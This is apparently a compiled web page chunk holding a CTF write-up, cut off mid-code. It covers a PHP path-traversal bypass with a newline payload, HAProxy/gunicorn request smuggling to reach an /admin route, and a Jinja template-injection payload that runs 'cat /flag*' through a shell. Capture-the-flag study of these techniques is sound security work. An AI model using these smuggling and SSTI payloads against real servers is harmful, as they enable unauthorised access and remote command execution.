import{S as VF,i as YF,s as sp,U as Dn,y as lp,z as ap,A as ep,V as op,W as gF,g as np,d as Fp,B as pp,X as kF,k as F,q as e,a as r,Y as d,e as xF,l as p,m as t,r as o,h as a,c as i,Z as E,n as Es,b as c,D as l,E as tp}from"../chunks/index.725d15e1.js";import{P as cp}from"../chunks/post_layout.b6bd0bbf.js";function rp(V){let y,A,S,R,D,h,Y,vs,ja,Ua,aa,ss,Wa,ea,fs,PF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" php="true"><div class="language-id">php</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&lt;?</span><span style="color: #EEFFFF">php</span></div><div class='line'></div><div class='line'><span style="color: #C792EA">function</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">normalize</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">path</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">parts </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">explode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">path</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">safeParts </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">[];</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">foreach</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">parts </span><span style="color: #89DDFF">as</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">part</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">part </span><span style="color: #89DDFF">===</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">.</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">||</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">part </span><span style="color: #89DDFF">===</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">''</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">continue</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">part </span><span style="color: #89DDFF">===</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">..</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #82AAFF">array_pop</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">safeParts</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">else</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">            </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">safeParts</span><span style="color: #89DDFF">[]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">part</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">    </span><span style="color: #546E7A">// Rebuild the path</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">implode</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">/</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">safeParts</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">isset</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">GET</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">source</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]))</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">showsource</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">__FILE</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">exit</span><span style="color: #89DDFF">();</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">isset</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">_GET</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">file</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">]))</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">_REQUEST</span><span style="color: #89DDFF">[</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">file</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">];</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">(!</span><span style="color: #82AAFF">preg_match</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'/^</span><span style="color: #C3E88D">.(php|flag).</span><span style="color: #89DDFF">/'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">file</span><span style="color: #89DDFF">))</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">real_file </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">normalize</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">file</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">readfile</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">real_file</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">else</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">die</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">nope</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">else</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">?&gt;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF">h3</span><span style="color: #89DDFF">&gt;&lt;</span><span style="color: #EEFFFF">a target</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">_blank</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> href</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/?source</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span><span style="color: #EEFFFF">Source</span><span style="color: #89DDFF">?&lt;/</span><span style="color: #EEFFFF">a</span><span style="color: #89DDFF">&gt;&lt;/</span><span style="color: #EEFFFF">h3</span><span style="color: #89DDFF">&gt;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF">form action</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> method</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">get</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> enctype</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">multipart/form-data</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">        Select a file to download</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF">input type</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">text</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> name</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">file</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> id</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">file</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">&lt;</span><span style="color: #EEFFFF">input type</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">submit</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> value</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Download!</span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF"> name</span><span style="color: #89DDFF">=</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">submit</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">&gt;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;/</span><span style="color: #EEFFFF">form</span><span style="color: #89DDFF">&gt;</span></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&lt;?</span><span style="color: #EEFFFF">php</span></div><div class='line'><span style="color: #EEFFFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">?&gt;</span></div></code></div></pre>`,hs,ls,Ba,oa,us,qF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">if (!preg_match('/^.(php|flag)./', $file)) &#123;</span></div></code></div></pre>`,_s,u,Ka,ms,Na,Ma,As,za,Qa,ws,Za,Ja,Cs,Xa,Va,na,I,Ya,bs,se,le,Fa,Ts,HF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" php="true"><div class="language-id">php</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">foreach</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">parts </span><span style="color: #89DDFF">as</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">part</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">part </span><span style="color: #89DDFF">===</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">.</span><span style="color: #89DDFF">'</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">||</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">part </span><span style="color: #89DDFF">===</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">''</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">continue</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">part </span><span style="color: #89DDFF">===</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">..</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #82AAFF">array_pop</span><span style="color: #89DDFF">($</span><span style="color: #EEFFFF">safeParts</span><span style="color: #89DDFF">);</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">else</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">safeParts</span><span style="color: #89DDFF">[]</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">$</span><span style="color: #EEFFFF">part</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">&#125;</span></div></code></div></pre>`,gs,w,ae,ks,ee,oe,xs,ne,Fe,Os,pe,te,pa,Ps,$F=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">&#92;n/../index.php</span></div></code></div></pre>`,qs,L,ce,Hs,re,ie,ta,$s,SF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">import</span><span style="color: #EEFFFF"> requests</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">payload </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #EEFFFF">&#92;n</span><span style="color: #C3E88D">/../.ht_flag.txt</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">r </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> requests</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span></div><div class='line'><span style="color: #82AAFF">    </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">http://3.142.89.90:32989?file=asd</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span></div><div class='line'><span style="color: #82AAFF">    </span><span style="color: #EEFFFF">data</span><span style="color: #89DDFF">=&#123;</span></div><div class='line'><span style="color: #82AAFF">        </span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">file</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">:</span><span style="color: #82AAFF"> payload</span></div><div class='line'><span style="color: #82AAFF">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'><span style="color: #89DDFF">)</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">r</span><span style="color: #89DDFF">.</span><span style="color: #F07178">text</span><span style="color: #89DDFF">)</span></div></code></div></pre>`,Ss,Q,as,ye,ca,es,Rs,De,ra,G,de,Is,Ee,ve,ia,Ls,RF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">@</span><span style="color: #82AAFF">app</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">post</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">/admin</span><span style="color: #89DDFF">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #C792EA">def</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">admin</span><span style="color: #89DDFF">():</span></div><div class='line'><span style="color: #EEFFFF">    user_input </span><span style="color: #89DDFF">=</span><span style="color: #EEFFFF"> request</span><span style="color: #89DDFF">.</span><span style="color: #F07178">form</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">get</span><span style="color: #89DDFF">(</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">input</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">user_input</span><span style="color: #89DDFF">,</span><span style="color: #82AAFF"> </span><span style="color: #EEFFFF">file</span><span style="color: #89DDFF">=</span><span style="color: #82AAFF">sys</span><span style="color: #89DDFF">.</span><span style="color: #F07178">stderr</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">if</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">any</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">bl_item </span><span style="color: #89DDFF">in</span><span style="color: #82AAFF"> user_input </span><span style="color: #89DDFF">for</span><span style="color: #82AAFF"> bl_item </span><span style="color: #89DDFF">in</span><span style="color: #82AAFF"> blacklist</span><span style="color: #89DDFF">):</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">Blocked input!</span><span style="color: #89DDFF">"</span></div><div class='line'></div><div class='line'></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">try</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">render_template_string</span><span style="color: #89DDFF">(</span><span style="color: #C792EA">f</span><span style="color: #C3E88D">"Output: </span><span style="color: #82AAFF">&#123;user_input&#125;</span><span style="color: #C3E88D">"</span><span style="color: #89DDFF">)</span></div><div class='line'><span style="color: #EEFFFF">    </span><span style="color: #89DDFF">except</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">Exception</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">as</span><span style="color: #EEFFFF"> e</span><span style="color: #89DDFF">:</span></div><div class='line'><span style="color: #EEFFFF">        </span><span style="color: #89DDFF">return</span><span style="color: #EEFFFF"> </span><span style="color: #FFCB6B">str</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">e</span><span style="color: #89DDFF">)</span></div></code></div></pre>`,Gs,O,fe,js,he,ue,Us,_e,me,ya,Ws,IF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" conf="true"><div class='code-container'><code>frontend http
    bind *:80
    default_backend web

    acl restricted_page path_sub -i admin
    http-request deny if restricted_page
    acl restricted_page path_sub %
    http-request deny if restricted_page</code></div></pre><!-- Note from shiki-twoslash: the language conf was not set up for Shiki to use, and so there is no code highlighting -->`,Bs,C,Ae,Ks,we,Ce,Ns,be,Te,Ms,ge,ke,Da,zs,LF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">FROM haproxy:1.9.10</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">USER root</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">RUN apt update -y</span></div><div class='line'><span style="color: undefined">RUN apt install -y python3 python3-pip</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">RUN pip3 install -v 'gunicorn&lt;=20.0.4'</span></div><div class='line'><span style="color: undefined">RUN pip3 install flask</span></div></code></div></pre>`,Qs,b,xe,Zs,Oe,Pe,Js,qe,He,Xs,$e,Se,da,Vs,GF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">GET / HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost</span></div><div class='line'><span style="color: undefined">Content-Length: 68</span></div><div class='line'><span style="color: undefined">Sec-Websocket-Key1: x</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">xxxxxxxxGET /admin HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost</span></div><div class='line'><span style="color: undefined">Content-Length: 35</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">GET / HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost</span></div><div class='line'><span style="color: undefined"></span></div></code></div></pre>`,Ys,v,Re,sl,Ie,Le,ll,Ge,je,al,Ue,We,el,Be,Ke,ol,Ne,Me,nl,ze,Qe,Ea,_,Ze,Fl,Je,Xe,pl,Ve,Ye,tl,so,lo,cl,ao,eo,va,rl,jF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" html="true"><div class="language-id">html</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">&#123;% with a=&#123;&#125; %&#125;&#123;% endwith %&#125;</span></div></code></div></pre>`,il,T,oo,yl,no,Fo,Dl,po,to,dl,co,ro,fa,El,UF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&#123;%</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">with</span><span style="color: #EEFFFF"> a=</span><span style="color: #89DDFF">""</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__class__</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__mro__</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">].</span><span style="color: #EEFFFF">__subclasses__</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">%&#125;&#123;%</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">a</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">%&#125;&#123;%</span><span style="color: #EEFFFF"> endwith </span><span style="color: #89DDFF">%&#125;</span></div></code></div></pre>`,vl,j,io,fl,yo,Do,ha,hl,WF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" python="true"><div class="language-id">python</div><div class='code-container'><code><div class='line'><span style="color: #89DDFF">&#123;%</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">with</span><span style="color: #EEFFFF"> a=</span><span style="color: #89DDFF">""</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__class__</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">__mro__</span><span style="color: #89DDFF">[</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">].</span><span style="color: #EEFFFF">__subclasses__</span><span style="color: #89DDFF">()[</span><span style="color: #F78C6C">213</span><span style="color: #89DDFF">](</span><span style="color: #89DDFF">'</span><span style="color: #C3E88D">cat /flag*</span><span style="color: #89DDFF">'</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF">shell</span><span style="color: #89DDFF">=True,</span><span style="color: #EEFFFF">stdout</span><span style="color: #89DDFF">=-</span><span style="color: #F78C6C">1</span><span style="color: #89DDFF">).</span><span style="color: #82AAFF">communicate</span><span style="color: #89DDFF">()</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">%&#125;&#123;%</span><span style="color: #EEFFFF"> </span><span style="color: #82AAFF">print</span><span style="color: #89DDFF">(</span><span style="color: #82AAFF">a</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">%&#125;&#123;%</span><span style="color: #EEFFFF"> endwith </span><span style="color: #89DDFF">%&#125;</span></div></code></div></pre>`,ul,os,Eo,ua,_l,BF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF"><div class='code-container'><code><div class='line'><span style="color: undefined">GET / HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost:80</span></div><div class='line'><span style="color: undefined">Content-Length: 261</span></div><div class='line'><span style="color: undefined">Sec-Websocket-Key1: x</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">xxxxxxxxPOST /admin HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost</span></div><div class='line'><span style="color: undefined">Content-Length: 177</span></div><div class='line'><span style="color: undefined">Content-Type: application/x-www-form-urlencoded</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined">input=&#123;% with a="".__class__.__mro__[1].__subclasses__()[213]('cat /flag*',shell=True,stdout=-1).communicate()</span></div><div class='line'><span style="color: undefined"> %&#125;&#123;% print(a) %&#125;&#123;% endwith %&#125;GET / HTTP/1.1</span></div><div class='line'><span style="color: undefined">Host: localhost</span></div><div class='line'><span style="color: undefined"></span></div><div class='line'><span style="color: undefined"></span></div></code></div></pre>`,ml,Z,ns,vo,_a,Fs,Al,fo,ma,ps,ho,Aa,P,J,uo,wl,_o,mo,Ao,ts,wo,Cl,Co,bo,X,To,bl,go,ko,wa,cs,xo,Ca,Tl,KF=`<pre class="shiki material-default" style="background-color: #263238; color: #EEFFFF" javascript="true"><div class="language-id">javascript</div><div class='code-container'><code><div class='line'><span style="color: #EEFFFF">app</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">use</span><span style="color: #EEFFFF">(</span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> res</span><span style="color: #89DDFF">,</span><span style="color: #EEFFFF"> next</span><span style="color: #89DDFF">)</span><span style="color: #EEFFFF"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #EEFFFF"> </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">if</span><span style="color: #F07178">([</span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">body</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">headers</span><span style="color: #89DDFF">,</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">query</span><span style="color: #F07178">]</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">some</span><span style="color: #F07178">(</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #89DDFF">(</span><span style="color: #EEFFFF">item</span><span style="color: #89DDFF">)</span><span style="color: #F07178"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">item</span><span style="color: #F07178"> </span><span style="color: #89DDFF">&&</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">JSON</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">stringify</span><span style="color: #F07178">(</span><span style="color: #EEFFFF">item</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">includes</span><span style="color: #F07178">(</span><span style="color: #89DDFF">"</span><span style="color: #C3E88D">flag</span><span style="color: #89DDFF">"</span><span style="color: #F07178">)</span></div><div class='line'><span style="color: #F07178">    )) </span><span style="color: #89DDFF">&#123;</span></div><div class='line'><span style="color: #F07178">        </span><span style="color: #89DDFF">return</span><span style="color: #F07178"> </span><span style="color: #EEFFFF">res</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">status</span><span style="color: #F07178">(</span><span style="color: #F78C6C">403</span><span style="color: #F07178">)</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">end</span><span style="color: #F07178">()</span><span style="color: #89DDFF">;</span></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">&#125;</span></div><div class='line'></div><div class='line'><span style="color: #F07178">    </span><span style="color: #89DDFF">if</span><span style="color: #F07178"> (</span><span style="color: #EEFFFF">req</span><span style="color: #89DDFF">.</span><span style="color: #EEFFFF">originalUrl</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">toLowerCase</span><span style="color: #F07178">()</span><span style="color: #89DDFF">.</span><span style="color: #82AAFF">startsWith</span><span style="color: #F07178">(</span><span style="color: 